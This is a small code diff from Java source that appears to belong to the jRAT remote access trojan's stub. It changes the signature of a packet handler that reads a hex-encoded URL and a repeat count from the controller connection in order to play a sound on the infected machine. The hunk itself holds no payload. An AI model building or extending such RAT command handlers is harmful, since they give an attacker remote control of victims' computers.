@@ -13,7 +13,7 @@ import se.jrat.stub.Connection;
 public class Packet44PlaySoundFromURL extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		String url = Connection.instance.readLine();
 		int times = Connection.instance.readInt();
 		url = Hex.decode(url.substring(2, url.length()));
